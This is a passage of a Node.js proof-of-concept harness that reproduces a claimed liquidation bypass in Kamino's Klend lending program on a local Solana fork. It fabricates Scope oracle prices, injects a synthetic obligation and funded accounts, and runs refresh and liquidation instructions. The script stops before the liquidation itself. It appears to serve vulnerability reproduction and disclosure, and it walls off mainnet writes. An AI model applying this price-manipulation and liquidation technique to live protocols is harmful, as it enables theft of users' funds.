#!/usr/bin/env node
"use strict";

// End-to-end local-fork reproduction for the Kamino Klend reduced-price-status liquidation bypass.
//
// GOAL: execute `liquidate_obligation_and_redeem_reserve_collateral` (V1) against cloned mainnet
// state while the withdraw (collateral) reserve carries a TWAP-failed reduced price_status that
// LIQUIDATION_CHECKS (0x23) accepts but ALL_CHECKS (0x3f) rejects.
//
// HOW: on our own local validator we inject arbitrary genesis state:
//   * a synthetic Obligation (deposit in ETH reserve, borrow in USDC reserve),
//   * funded/empty SPL token accounts owned by our throwaway liquidator,
//   * fabricated Scope OraclePrices accounts (collateral price scaled away from TWAP).
// The program itself then derives the obligation's market values from the manipulated price via
// refresh_obligation, and the liquidation executes through the real instruction path.
//
// SECRETS CONTRACT: rpc_endpoints.txt read in-process; upstream value never printed/logged/
// hashed/persisted/on argv. Validator only receives http://127.0.0.1:<relayPort>. Local only.
//
// Env:
//   KAMINO_LIQ_MODE      probe|execute   (default: probe if KAMINO_LIQ_DEBT_SF unset else execute)
//   KAMINO_LIQ_DEBT_SF   decimal string, obligation borrows[0].borrowed_amount_sf (Fraction bits)
//   KAMINO_LIQ_SCALE_NUM/DEN  spot scaling (default 3/10)
//   KAMINO_LIQ_TARGET    target user_ltv for probe calibration (default 0.88)

const fs = require("fs");
const os = require("os");
const net = require("net");
const path = require("path");
const http = require("http");
const crypto = require("crypto");
const { spawn, spawnSync } = require("child_process");

const IS_WIN = process.platform === "win32";
const EXE = IS_WIN ? ".exe" : "";
const WORKSPACE = path.resolve(__dirname, "..");
const BIN_DIR = process.env.SOLANA_HARNESS_BIN_DIR || (IS_WIN
  ? path.join(WORKSPACE, "tools", "solana", "releases", "3.1.14", "solana-release", "bin")
  : path.join(process.env.HOME || "/home/mruserbox", ".local", "share", "solana-fork-harness", "v3.1.14", "solana-release", "bin"));
const VALIDATOR_BIN = path.join(BIN_DIR, `solana-test-validator${EXE}`);
const ENDPOINTS_FILE = path.join(WORKSPACE, "rpc_endpoints.txt");
const EVIDENCE_DIR = process.env.SOLANA_HARNESS_EVIDENCE_DIR || path.join(WORKSPACE, "reports", "raw", "fast", "kamino-klend-fork");

const MAINNET_GENESIS = "5eykt4UsFv8P8NJdTREpY1vzqKqZKvdpKuc147dw2N9d";
const PROGRAM_ID = "KLend2g3cP87fffoy8q1mQqGKjrxjC8boSyAYavgmjD";
const MAIN_MARKET = "7u3HeHxYDLhnCoErrtycNokbQYbWGzLs6JSDqGAv5PfF";
const SPL_TOKEN_PROGRAM = "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA";
const SYSVAR_INSTRUCTIONS = "Sysvar1nstructions1111111111111111111111111";

const SCALE_NUM = BigInt(process.env.KAMINO_LIQ_SCALE_NUM || "3");
const SCALE_DEN = BigInt(process.env.KAMINO_LIQ_SCALE_DEN || "10");
const TARGET = Number(process.env.KAMINO_LIQ_TARGET || "0.88");
const TWO60 = 1n << 60n;
const MODE = process.env.KAMINO_LIQ_MODE || (process.env.KAMINO_LIQ_DEBT_SF ? "execute" : "probe");
const DEBT_SF = process.env.KAMINO_LIQ_DEBT_SF ? BigInt(process.env.KAMINO_LIQ_DEBT_SF) : null;

const RESERVE_SIZE = 8624;
const R = {
  version: 8, lastUpdateSlot: 16, lastUpdateStale: 24, lastUpdateStatus: 25,
  farmCollateral: 64, farmDebt: 96,
  liquidityMint: 128, liquiditySupplyVault: 160, liquidityFeeVault: 192,
  totalAvailableAmount: 224, borrowedAmountSf: 232, marketPriceSf: 248,
  marketPriceLastUpdatedTs: 264, mintDecimals: 272, cumulativeBorrowRateBsf: 296, liquidityTokenProgram: 408,
  collateralMint: 2560, collateralSupplyVault: 2600,
  config: 4856, configStatus: 4856, configEmergencyMode: 4864, configLiqFeePct: 4871,
  configLtv: 4872, configLiqThreshold: 4873, configMinBonus: 4874, configMaxBonus: 4876,
  configBadDebtBonus: 4878, configBorrowFactorPct: 5008, tokenInfo: 5032,
};
const O = {
  lastUpdateSlot: 16, lastUpdateStale: 24, lastUpdateStatus: 25, lendingMarket: 32, owner: 64,
  deposits: 96, depositSlot: 136, borrows: 1208, borrowSlot: 200,
  depositedValueSf: 1192, bfAdjustedDebt: 2208, unhealthyBorrow: 2256, size: 3344,
};
const SCOPE_PRICES_OFFSET = 40;
const SCOPE_ENTRY_SIZE = 56;
const FLAGS = { PRICE_LOADED: 0x01, PRICE_AGE_CHECKED: 0x02, TWAP_CHECKED: 0x04, TWAP_AGE_CHECKED: 0x08, HEURISTIC_CHECKED: 0x10, PRICE_USAGE_ALLOWED: 0x20, LIQUIDATION_CHECKS: 0x23, ALL_CHECKS: 0x3f };

const CAPS = { upstreamTimeoutMs: 180000, healthTimeoutMs: Number(process.env.SOLANA_HARNESS_HEALTH_MS || 300000), txTimeoutMs: 60000, maxCandidates: 10 };
const DENIED = new Set(["sendTransaction", "sendRawTransaction", "requestAirdrop", "simulateTransaction", "sendBundle"]);
const methodAllowed = (m) => typeof m === "string" && !DENIED.has(m) && /^(get|is)/.test(m);
const isLoopback = (r) => r === "127.0.0.1" || r === "::1" || r === "::ffff:127.0.0.1";
const sha256 = (b) => crypto.createHash("sha256").update(b).digest("hex");
const disc = (name) => crypto.createHash("sha256").update(`global:${name}`).digest().subarray(0, 8);
const accountDisc = (name) => crypto.createHash("sha256").update(`account:${name}`).digest().subarray(0, 8);
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const decodeData = (acct) => { const x = acct && acct.data; const s = Array.isArray(x) ? x[0] : x; return Buffer.from(s || "", "base64"); };
function u128At(d, off) { let n = 0n; for (let i = 15; i >= 0; i--) n = (n << 8n) + BigInt(d[off + i]); return n; }
function writeU128(d, off, v) { let n = v; for (let i = 0; i < 16; i++) { d[off + i] = Number(n & 0xffn); n >>= 8n; } }
function pkBytes(pk) { return new (require("@solana/web3.js").PublicKey)(pk).toBuffer(); }
function writePk(d, off, pk) { pkBytes(pk).copy(d, off); }

function readCandidates() {
  const text = fs.readFileSync(ENDPOINTS_FILE, "utf8");
  const urls = []; const seen = new Set();
  for (const line of text.split(/\r?\n/)) {
    if (!/solana|helius|mainnet-beta|rpcpool|quicknode/i.test(line)) continue;
    const m = line.match(/https?:\/\/[^\s\]\)]+/); if (!m) continue;
    const u = m[0].replace(/[.,;]+$/, "");
    if (u.includes("...") || seen.has(u)) continue;
    seen.add(u); urls.push(u);
    if (urls.length >= CAPS.maxCandidates) break;
  }
  return urls;
}
async function upstreamRaw(endpoint, body, timeoutMs) {
  const ac = new AbortController(); const timer = setTimeout(() => ac.abort(), timeoutMs);
  try { const r = await fetch(endpoint, { method: "POST", headers: { "content-type": "application/json" }, body, signal: ac.signal }); if (!r.ok) throw new Error("upstream-http"); return await r.text(); }
  finally { clearTimeout(timer); }
}
async function upstreamCall(endpoint, req, timeoutMs) { return JSON.parse(await upstreamRaw(endpoint, JSON.stringify(req), timeoutMs)); }
async function qualify() {
  for (const [i, ep] of readCandidates().entries()) {
    try { const r = await upstreamCall(ep, { jsonrpc: "2.0", id: 1, method: "getGenesisHash", params: [] }, 8000); if (r && r.result === MAINNET_GENESIS) return { endpoint: ep, tested: i + 1 }; } catch (_) { /* next */ }
  }
  throw new Error("no-qualified-endpoint");
}
function startRelay(endpoint) {
  const counts = Object.create(null), denied = Object.create(null); let bytesIn = 0, bytesOut = 0;
  const server = http.createServer((req, res) => {
    if (req.method !== "POST" || !isLoopback(req.socket.remoteAddress)) { res.writeHead(403); res.end(); return; }
    const chunks = []; let n = 0;
    req.on("data", (c) => { n += c.length; chunks.push(c); });
    req.on("end", async () => {
      let payload, raw;
      try { raw = Buffer.concat(chunks).toString("utf8"); payload = JSON.parse(raw); } catch { res.writeHead(400); res.end(); return; }
      const list = Array.isArray(payload) ? payload : [payload];
      for (const x of list) { const m = x && x.method; if (!methodAllowed(m)) { denied[String(m)] = (denied[String(m)] || 0) + 1; res.writeHead(403, { "content-type": "application/json" }); res.end(JSON.stringify({ jsonrpc: "2.0", id: (x && x.id) ?? null, error: { code: -32601, message: "relay-denied" } })); return; } counts[m] = (counts[m] || 0) + 1; }
      bytesIn += n;
      try { const t = await upstreamRaw(endpoint, raw, CAPS.upstreamTimeoutMs); const b = Buffer.from(t); bytesOut += b.length; res.writeHead(200, { "content-type": "application/json", "content-length": b.length }); res.end(b); }
      catch { res.writeHead(502, { "content-type": "application/json" }); res.end(JSON.stringify({ jsonrpc: "2.0", id: (list[0] && list[0].id) ?? null, error: { code: -32000, message: "relay-upstream" } })); }
    });
  });
  return new Promise((resolve, reject) => { server.once("error", reject); server.listen(0, "127.0.0.1", () => resolve({ server, port: server.address().port, stats: () => ({ methods: counts, deniedMethods: denied, bytesIn, bytesOut }) })); });
}
function portFree(port) { return new Promise((res) => { const s = net.createServer(); s.once("error", () => res(false)); s.once("listening", () => s.close(() => res(true))); s.listen(port, "127.0.0.1"); }); }
async function findConsecutiveFree(start, span) { for (let p = start; p < start + span; p++) if ((await portFree(p)) && (await portFree(p + 1))) return p; throw new Error("no-free-port"); }
async function findFreeRange(start, span, need) { for (let p = start; p < start + span; p++) { let ok = true; for (let i = 0; i < need; i++) if (!(await portFree(p + i))) { ok = false; break; } if (ok) return p; } throw new Error("no-free-range"); }
async function localCall(url, method, params = [], timeoutMs = 30000) {
  const ac = new AbortController(); const timer = setTimeout(() => ac.abort(), timeoutMs);
  try { const r = await fetch(url, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ jsonrpc: "2.0", id: 1, method, params }), signal: ac.signal }); const j = await r.json(); if (j.error) throw new Error(`local-rpc-${j.error.message}`); return j.result; }
  finally { clearTimeout(timer); }
}
async function waitHealth(url, timeoutMs) { const dl = Date.now() + timeoutMs; while (Date.now() < dl) { try { if ((await localCall(url, "getHealth", [], 3000)) === "ok") return true; } catch (_) { /* wait */ } await sleep(1000); } return false; }
async function waitSig(conn, sig, timeoutMs) { const dl = Date.now() + timeoutMs; let last = null; while (Date.now() < dl) { const r = await conn.getSignatureStatus(sig, { searchTransactionHistory: true }); last = r && r.value ? r.value : null; if (last && (last.confirmationStatus === "confirmed" || last.confirmationStatus === "finalized")) return last; if (last && last.err) return last; await sleep(500); } return last; }
function sanitizeLog(t) { return t.replace(/https?:\/\/[^\s"']+/g, (u) => (/^https?:\/\/(127\.0\.0\.1|localhost|\[::1\])([:/]|$)/.test(u) ? u : "<redacted-nonlocal-url>")); }
function accountJson(pubkey, lamports, dataB64, owner, executable) { return { pubkey, account: { lamports, data: [dataB64, "base64"], owner, executable: !!executable, rentEpoch: 0 } }; }

function parseReserve(pubkey, d) {
  const PK = require("@solana/web3.js").PublicKey;
  const addr = (o) => { const b = d.subarray(o, o + 32); return b.some((x) => x !== 0) ? new PK(b).toBase58() : null; };
  const nameBytes = d.subarray(R.tokenInfo, R.tokenInfo + 32);
  const z = nameBytes.indexOf(0);
  const name = nameBytes.subarray(0, z < 0 ? nameBytes.length : z).toString("utf8").replace(/[^\x20-\x7e]/g, "");
  return {
    pubkey, name, version: d.readBigUInt64LE(R.version),
    lastUpdateSlot: Number(d.readBigUInt64LE(R.lastUpdateSlot)), status: d.readUInt8(R.lastUpdateStatus),
    farmCollateral: addr(R.farmCollateral), farmDebt: addr(R.farmDebt),
    liquidityMint: addr(R.liquidityMint), liquiditySupplyVault: addr(R.liquiditySupplyVault), liquidityFeeVault: addr(R.liquidityFeeVault),
    totalAvailableAmount: d.readBigUInt64LE(R.totalAvailableAmount), borrowedAmountSf: u128At(d, R.borrowedAmountSf),
    marketPriceSf: u128At(d, R.marketPriceSf), marketPriceLastUpdatedTs: d.readBigUInt64LE(R.marketPriceLastUpdatedTs),
    mintDecimals: Number(d.readBigUInt64LE(R.mintDecimals)),
    cumulativeBorrowRateBsf: d.subarray(R.cumulativeBorrowRateBsf, R.cumulativeBorrowRateBsf + 32),
    liquidityTokenProgram: addr(R.liquidityTokenProgram),
    collateralMint: addr(R.collateralMint), collateralSupplyVault: addr(R.collateralSupplyVault),
    configStatus: d.readUInt8(R.configStatus), emergencyMode: d.readUInt8(R.configEmergencyMode),
    liqFeePct: d.readUInt8(R.configLiqFeePct), ltvPct: d.readUInt8(R.configLtv), liqThresholdPct: d.readUInt8(R.configLiqThreshold),
    minBonusBps: d.readUInt16LE(R.configMinBonus), maxBonusBps: d.readUInt16LE(R.configMaxBonus), badDebtBonusBps: d.readUInt16LE(R.configBadDebtBonus),
    borrowFactorPct: Number(d.readBigUInt64LE(R.configBorrowFactorPct)),
    priceChain: [0, 1, 2, 3].map((i) => d.readUInt16LE(R.tokenInfo + 112 + i * 2)),
    twapChain: [0, 1, 2, 3].map((i) => d.readUInt16LE(R.tokenInfo + 120 + i * 2)),
    scopeFeed: addr(R.tokenInfo + 80),
    maxAgePriceSeconds: Number(d.readBigUInt64LE(R.tokenInfo + 64)),
    maxAgeTwapSeconds: Number(d.readBigUInt64LE(R.tokenInfo + 72)),
    heuristicLower: d.readBigUInt64LE(R.tokenInfo + 32).toString(),
    heuristicUpper: d.readBigUInt64LE(R.tokenInfo + 40).toString(),
    heuristicExp: d.readBigUInt64LE(R.tokenInfo + 48).toString(),
    blockPriceUsage: d.readUInt8(R.tokenInfo + 224),
  };
}

function tokenAccountData(mint, owner, amount) {
  const b = Buffer.alloc(165);
  writePk(b, 0, mint); writePk(b, 32, owner);
  b.writeBigUInt64LE(BigInt(amount), 64);
  b.writeUInt32LE(0, 72); b.writeUInt8(1, 108); b.writeUInt32LE(0, 109); b.writeBigUInt64LE(0n, 113); b.writeBigUInt64LE(0n, 121); b.writeUInt32LE(0, 129);
  return b;
}
function obligationData(market, owner, collateralReserve, depositedAmount, debtReserve, borrowedAmountSf, cumulativeRate32) {
  const b = Buffer.alloc(O.size);
  accountDisc("Obligation").copy(b, 0);
  b.writeBigUInt64LE(0n, 8); // tag
  b.writeBigUInt64LE(0n, O.lastUpdateSlot); b.writeUInt8(0, O.lastUpdateStale); b.writeUInt8(0x23, O.lastUpdateStatus);
  writePk(b, O.lendingMarket, market); writePk(b, O.owner, owner);
  writePk(b, O.deposits, collateralReserve); b.writeBigUInt64LE(BigInt(depositedAmount), O.deposits + 32);
  writePk(b, O.borrows, debtReserve); cumulativeRate32.copy(b, O.borrows + 32); writeU128(b, O.borrows + 88, borrowedAmountSf);
  b.writeUInt8(1, 2287); // has_debt
  return b;
}

// ---- real entry (kept separate so syntax checks are easy) ----
async function run() {
  const evidence = {
    schema: "kamino-klend-liquidation-repro/1", generatedAt: new Date().toISOString(), mode: MODE,
    scale: `${SCALE_NUM}/${SCALE_DEN}`, target: TARGET,
    host: null, endpoint: {}, selected: {}, fabrication: null, clones: [], cloneProof: null,
    preLiquidation: null, liquidation: null, postLiquidation: null, economics: null,
    result: "UNKNOWN", unproven: [],
  };
  evidence.host = { platform: process.platform, arch: process.arch, node: process.version, validator: sanitizeLog(spawnSync(VALIDATOR_BIN, ["--version"], { encoding: "utf8" }).stdout || "").trim() };
  if (!fs.existsSync(VALIDATOR_BIN)) throw new Error("validator-binary-missing");

  const web3 = require("@solana/web3.js");
  const { endpoint, tested } = await qualify();
  evidence.endpoint = { qualified: true, candidatesTested: tested };

  // 1. Select reserves from live main-market state.
  const gpa = await upstreamCall(endpoint, {
    jsonrpc: "2.0", id: 2, method: "getProgramAccounts",
    params: [PROGRAM_ID, { commitment: "finalized", encoding: "base64", filters: [{ dataSize: RESERVE_SIZE }, { memcmp: { offset: 32, bytes: MAIN_MARKET } }] }],
  }, CAPS.upstreamTimeoutMs);
  const all = (gpa.result || []).map((x) => parseReserve(x.pubkey, decodeData(x.account)));
  const prefer = (order) => (r) => { const i = order.indexOf(r.name); return i < 0 ? 999 : i; };
  const collPref = ["ETH", "JITOSOL", "bbSOL", "xBTC", "WBTC", "fBTC", "JupSOL", "MSOL"];
  const collateral = all
    .filter((r) => r.configStatus === 0 && r.liqThresholdPct >= 60 && !r.farmCollateral && r.scopeFeed && r.priceChain.some((id) => id < 512) && r.marketPriceSf > 0n)
    .sort((a, b) => prefer(collPref)(a) - prefer(collPref)(b))[0];
  const debt = all
    .filter((r) => r.configStatus === 0 && !r.farmDebt && r.liquidityMint && r.totalAvailableAmount > 0n && r.scopeFeed)
    .sort((a, b) => prefer(["USDC", "USDT"])(a) - prefer(["USDC", "USDT"])(b) || Number(b.totalAvailableAmount - a.totalAvailableAmount))[0];
  if (!collateral) throw new Error("no-collateral-reserve-selected");
  if (!debt) throw new Error("no-debt-reserve-selected");
  if (collateral.scopeFeed === debt.scopeFeed) throw new Error("collateral-and-debt-share-scope-feed");
  evidence.selected = { collateral: { pubkey: collateral.pubkey, name: collateral.name, ...pick(collateral) }, debt: { pubkey: debt.pubkey, name: debt.name, ...pick(debt) } };
  console.log(`[liq] collateral=${collateral.name} ${collateral.pubkey} ltv=${collateral.ltvPct} liqThr=${collateral.liqThresholdPct} | debt=${debt.name} ${debt.pubkey} bf=${debt.borrowFactorPct}`);

  // 2. Fetch + fabricate the two Scope accounts.
  const collScopeAcct = await upstreamCall(endpoint, { jsonrpc: "2.0", id: 3, method: "getAccountInfo", params: [collateral.scopeFeed, { encoding: "base64", commitment: "finalized" }] }, CAPS.upstreamTimeoutMs);
  const debtScopeAcct = await upstreamCall(endpoint, { jsonrpc: "2.0", id: 4, method: "getAccountInfo", params: [debt.scopeFeed, { encoding: "base64", commitment: "finalized" }] }, CAPS.upstreamTimeoutMs);
  if (!collScopeAcct.result?.value || !debtScopeAcct.result?.value) throw new Error("scope-account-missing");
  const collScope = decodeData(collScopeAcct.result.value);
  const debtScope = decodeData(debtScopeAcct.result.value);
  const nowSec = Math.floor(Date.now() / 1000);
  const futureTs = nowSec + 3 * 86400;
  const addrOf = (r) => r;
  const collPriceIdx = collateral.priceChain.find((id) => id < 512 && !collateral.twapChain.includes(id));
  if (collPriceIdx === undefined) throw new Error("no-divergent-collateral-price-entry");
  const realCollSpot = collScope.readBigUInt64LE(SCOPE_PRICES_OFFSET + collPriceIdx * SCOPE_ENTRY_SIZE);
  const collSpotExp = collScope.readBigUInt64LE(SCOPE_PRICES_OFFSET + collPriceIdx * SCOPE_ENTRY_SIZE + 8);
  const scaledSpot = (realCollSpot * SCALE_NUM) / SCALE_DEN;
  writeBigU64(collScope, SCOPE_PRICES_OFFSET + collPriceIdx * SCOPE_ENTRY_SIZE, scaledSpot);
  writeBigU64(collScope, SCOPE_PRICES_OFFSET + collPriceIdx * SCOPE_ENTRY_SIZE + 24, futureTs);
  for (const id of collateral.twapChain) if (id < 512) writeBigU64(collScope, SCOPE_PRICES_OFFSET + id * SCOPE_ENTRY_SIZE + 24, futureTs);
  for (const id of [debt.priceChain[0], debt.twapChain[0]]) if (id !== undefined && id < 512) writeBigU64(debtScope, SCOPE_PRICES_OFFSET + id * SCOPE_ENTRY_SIZE + 24, futureTs);
  evidence.fabrication = {
    collateral: { feed: collateral.scopeFeed, entry: collPriceIdx, realSpot: realCollSpot.toString(), scaledSpot: scaledSpot.toString(), exp: collSpotExp.toString() },
    debt: { feed: debt.scopeFeed, priceEntry: debt.priceChain[0], twapEntry: debt.twapChain[0] },
    spotTs: futureTs,
  };
  console.log(`[liq] fabricated collateral spot ${realCollSpot} -> ${scaledSpot} at scope entry ${collPriceIdx}`);

  // 3. Build injected accounts BEFORE genesis.
  const liquidator = web3.Keypair.generate();
  const authority = web3.PublicKey.findProgramAddressSync([Buffer.from("lma"), new web3.PublicKey(MAIN_MARKET).toBuffer()], new web3.PublicKey(PROGRAM_ID))[0];
  const usdcUser = web3.Keypair.generate().publicKey;
  const cethUser = web3.Keypair.generate().publicKey;
  const wethUser = web3.Keypair.generate().publicKey;
  const obligationKp = web3.Keypair.generate();
  evidence.selected.liquidator = liquidator.publicKey.toBase58();
  evidence.selected.authority = authority.toBase58();

  const D = BigInt(process.env.KAMINO_LIQ_COLL_RAW || "10000000000"); // 100 cETH at 8 decimals
  const baseSf = BigInt(process.env.KAMINO_LIQ_DEBT_BASE_SF || (63420n * 1000000n * TWO60).toString());
  const probes = MODE === "execute" ? [DEBT_SF] : [baseSf * 60n / 100n, baseSf * 80n / 100n, baseSf, baseSf * 125n / 100n, baseSf * 150n / 100n];
  const obligations = probes.map((sf) => ({ kp: web3.Keypair.generate(), sf }));

  const SCPROG = collScopeAcct.result.value.owner;
  const tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), "kamino-liq-repro-"));
  const files = {};
  const writeAcct = (name, pubkey, lamports, data, owner) => { const f = path.join(tmpRoot, `${name}.json`); fs.writeFileSync(f, JSON.stringify(accountJson(pubkey, lamports, data.toString("base64"), owner, false), null, 2), "utf8"); files[name] = f; return f; };

  const reservePatch = (r, d) => { d.writeBigUInt64LE(0n, R.lastUpdateSlot); if (r === collateral) d.writeBigUInt64LE(0n, R.marketPriceLastUpdatedTs); return d; };
  // fetch raw reserve data again (need writable copies)
  const collResAcct = await upstreamCall(endpoint, { jsonrpc: "2.0", id: 5, method: "getAccountInfo", params: [collateral.pubkey, { encoding: "base64", commitment: "finalized" }] }, CAPS.upstreamTimeoutMs);
  const debtResAcct = await upstreamCall(endpoint, { jsonrpc: "2.0", id: 6, method: "getAccountInfo", params: [debt.pubkey, { encoding: "base64", commitment: "finalized" }] }, CAPS.upstreamTimeoutMs);
  const collResData = reservePatch(collateral, decodeData(collResAcct.result.value));
  const debtResData = reservePatch(debt, decodeData(debtResAcct.result.value));
  writeAcct("collReserve", collateral.pubkey, collResAcct.result.value.lamports, collResData, PROGRAM_ID);
  writeAcct("debtReserve", debt.pubkey, debtResAcct.result.value.lamports, debtResData, PROGRAM_ID);
  writeAcct("collScope", collateral.scopeFeed, collScopeAcct.result.value.lamports, collScope, collScopeAcct.result.value.owner);
  writeAcct("debtScope", debt.scopeFeed, debtScopeAcct.result.value.lamports, debtScope, debtScopeAcct.result.value.owner);
  // obligation + token accounts
  const obligationFiles = [];
  for (const o of obligations) {
    const data = obligationData(MAIN_MARKET, liquidator.publicKey, collateral.pubkey, D, debt.pubkey, o.sf, debt.cumulativeBorrowRateBsf);
    const f = writeAcct(`obligation_${o.kp.publicKey.toBase58().slice(0, 8)}`, o.kp.publicKey, 30000000, data, PROGRAM_ID);
    obligationFiles.push(f);
  }
  writeAcct("usdcUser", usdcUser, 10000000, tokenAccountData(debt.liquidityMint, liquidator.publicKey, 100000000000n), SPL_TOKEN_PROGRAM);
  writeAcct("cethUser", cethUser, 10000000, tokenAccountData(collateral.collateralMint, liquidator.publicKey, 0n), SPL_TOKEN_PROGRAM);
  writeAcct("wethUser", wethUser, 10000000, tokenAccountData(collateral.liquidityMint, liquidator.publicKey, 0n), SPL_TOKEN_PROGRAM);

  // 4. Validator.
  const relay = await startRelay(endpoint);
  const rpcPort = await findConsecutiveFree(8899, 500);
  const faucetPort = await findConsecutiveFree(9900, 500);
  const dynLo = await findFreeRange(18000, 500, 50);
  const ledgerDir = path.join(tmpRoot, "ledger");
  const relayUrl = `http://127.0.0.1:${relay.port}`;
  const rpcUrl = `http://127.0.0.1:${rpcPort}`;
  const cloneList = [collateral.liquidityMint, collateral.collateralMint, collateral.collateralSupplyVault, collateral.liquiditySupplyVault, collateral.liquidityFeeVault, debt.liquidityMint, debt.liquiditySupplyVault, authority.toBase58(), MAIN_MARKET];
  const args = [
    "--reset", "--ledger", ledgerDir, "--url", relayUrl, "--rpc-port", String(rpcPort), "--faucet-port", String(faucetPort),
    "--gossip-port", String(dynLo), "--dynamic-port-range", `${dynLo}-${dynLo + 49}`,
    "--clone-upgradeable-program", PROGRAM_ID, SPL_TOKEN_PROGRAM,
  ];
  for (const c of cloneList) args.push("--clone", c);
  for (const [name, f] of Object.entries(files)) args.push("--account", nameToPubkey(name, { collateral, debt, authority, usdcUser, cethUser, wethUser, obligations, liquidator }), f);

  let logBuf = "";
  const child = spawn(VALIDATOR_BIN, args, { cwd: tmpRoot, windowsHide: true, stdio: ["ignore", "pipe", "pipe"] });
  child.stdout.on("data", (d) => { if (logBuf.length < 400000) logBuf += d.toString(); });
  child.stderr.on("data", (d) => { if (logBuf.length < 400000) logBuf += d.toString(); });
  let exitInfo = null; child.on("exit", (code, signal) => { exitInfo = { code, signal }; });

  let ok = false;
  try {
    if (!(await waitHealth(rpcUrl, CAPS.healthTimeoutMs))) throw new Error("validator-health-timeout");
    const conn = new web3.Connection(rpcUrl, "confirmed");

    // clone proof
    const proof = [];
    for (const [label, addr, wantExec] of [["klend-program", PROGRAM_ID, true], ["collateral-reserve", collateral.pubkey, false], ["debt-reserve", debt.pubkey, false], ["spl-token", SPL_TOKEN_PROGRAM, true]]) {
      const info = await localCall(rpcUrl, "getAccountInfo", [addr, { encoding: "base64" }], 30000);
      proof.push({ label, address: addr, present: !!info?.value, owner: info?.value?.owner || null, executable: !!info?.value?.executable, dataLen: info?.value ? decodeData(info.value).length : null, wantExec });
    }
    evidence.clones = proof;
    evidence.cloneProof = { allPresent: proof.every((p) => p.present), programExecutable: proof.find((p) => p.label === "klend-program")?.executable === true, collateralOwnerLen: proof.find((p) => p.label === "collateral-reserve")?.dataLen === RESERVE_SIZE, debtOwnerLen: proof.find((p) => p.label === "debt-reserve")?.dataLen === RESERVE_SIZE };
    if (!evidence.cloneProof.allPresent || !evidence.cloneProof.programExecutable) throw new Error("clone-proof-failed");

    const airdrop = await conn.requestAirdrop(liquidator.publicKey, 5 * web3.LAMPORTS_PER_SOL);
    await waitSig(conn, airdrop, CAPS.txTimeoutMs);

    const refreshIx = (reserve) => new web3.TransactionInstruction({
      programId: new web3.PublicKey(PROGRAM_ID),
      keys: [
        { pubkey: new web3.PublicKey(reserve.pubkey), isSigner: false, isWritable: true },
        { pubkey: new web3.PublicKey(MAIN_MARKET), isSigner: false, isWritable: false },
        { pubkey: new web3.PublicKey(PROGRAM_ID), isSigner: false, isWritable: false },
        { pubkey: new web3.PublicKey(PROGRAM_ID), isSigner: false, isWritable: false },
        { pubkey: new web3.PublicKey(PROGRAM_ID), isSigner: false, isWritable: false },
        { pubkey: new web3.PublicKey(reserve.scopeFeed), isSigner: false, isWritable: false },
      ],
      data: Buffer.from(disc("refresh_reserve")),
    });
    const refreshObligIx = (obligation) => new web3.TransactionInstruction({
      programId: new web3.PublicKey(PROGRAM_ID),
      keys: [
        { pubkey: new web3.PublicKey(MAIN_MARKET), isSigner: false, isWritable: false },
        { pubkey: obligation, isSigner: false, isWritable: true },
        { pubkey: new web3.PublicKey(collateral.pubkey), isSigner: false, isWritable: true },
        { pubkey: new web3.PublicKey(debt.pubkey), isSigner: false, isWritable: true },
      ],
      data: Buffer.from(disc("refresh_obligation")),
    });

    const sendTx = async (ixs, extraSigners = []) => {
      const tx = new web3.Transaction().add(...ixs);
      const { blockhash } = await conn.getLatestBlockhash("confirmed");
      tx.recentBlockhash = blockhash; tx.feePayer = liquidator.publicKey; tx.sign(liquidator, ...extraSigners);
      let sig = null, err = null, errLogs = null;
      try { sig = await conn.sendRawTransaction(tx.serialize(), { skipPreflight: false, maxRetries: 3 }); }
      catch (e) { err = String(e?.message || e); if (Array.isArray(e?.logs)) errLogs = e.logs; }
      let txDetail = null;
      if (sig) { await waitSig(conn, sig, CAPS.txTimeoutMs); for (let i = 0; i < 8 && !txDetail; i++) { txDetail = await conn.getTransaction(sig, { commitment: "confirmed", maxSupportedTransactionVersion: 0 }); if (!txDetail) await sleep(800); } }
      const logs = (txDetail?.meta?.logMessages) || errLogs || [];
      if (!logs.length && err) { const m = err.match(/Logs:\s*\[([\s\S]*)\]\s*\.\s*Catch/); if (m) { try { logs.push(...JSON.parse(`[${m[1]}]`)); } catch (_) { /* leave */ } } }
      return { sig, err, txDetail, logs };
    };
    const readObligation = async (pk) => {
      await sleep(1200);
      const info = await localCall(rpcUrl, "getAccountInfo", [pk.toBase58(), { encoding: "base64", commitment: "confirmed" }], 30000);
      const d = decodeData(info.value);
      return { depositedValueSf: u128At(d, O.depositedValueSf), bfAdjustedDebt: u128At(d, O.bfAdjustedDebt), unhealthyBorrow: u128At(d, O.unhealthyBorrow), status: d.readUInt8(O.lastUpdateStatus), slot: Number(d.readBigUInt64LE(O.lastUpdateSlot)), stale: d.readUInt8(O.lastUpdateStale) };
    };
    const ratioOf = (o) => Number(Fraction(o.bfAdjustedDebt) / Fraction(o.depositedValueSf));

    // 5. Refresh each obligation via the real path and record derived values.
    const probeRows = [];
    for (const o of obligations) {
      const r = await sendTx([refreshIx(collateral), refreshIx(debt), refreshObligIx(o.kp.publicKey)]);
      const after = r.txDetail ? await readObligation(o.kp.publicKey) : null;
      probeRows.push({ pubkey: o.kp.publicKey.toBase58(), debtSf: o.sf.toString(), err: r.err, detailErr: r.txDetail?.meta?.err ?? null, logs: r.logs.filter((l) => /twap|TWAP|Price|Obligation|Liquidat|pnl|deposit|Borrow|Deposit/i.test(l)), values: after, ratio: after ? (Number(Fraction(after.bfAdjustedDebt) / Fraction(after.depositedValueSf))) : null });
    }
    evidence.preLiquidation = { probes: probeRows };
    for (const p of probeRows) console.log(`[liq] probe ${p.pubkey.slice(0, 8)} debtSf=${p.debtSf} err=${p.err} detailErr=${JSON.stringify(p.detailErr)} ratio=${p.ratio}`);

    if (MODE === "probe") {
      const good = probeRows.filter((p) => p.values && p.values.depositedValueSf > 0n);
      if (good.length) {
        const best = good.reduce((a, b) => Math.abs((a.ratio ?? 9) - TARGET) < Math.abs((b.ratio ?? 9) - TARGET) ? a : b);
        const needed = (BigInt(best.debtSf) * BigInt(Math.round(TARGET * 1e6)) / BigInt(Math.round((best.ratio || 1) * 1e6))).toString();
        evidence.probeResult = { bestPubkey: best.pubkey, bestRatio: best.ratio, suggestedDebtSf: needed, target: TARGET };
        console.log(`[liq] suggested DEBT_SF=${needed}`);
      }
      evidence.result = "PROBE_COMPLETE";
      ok = true;
    } else {
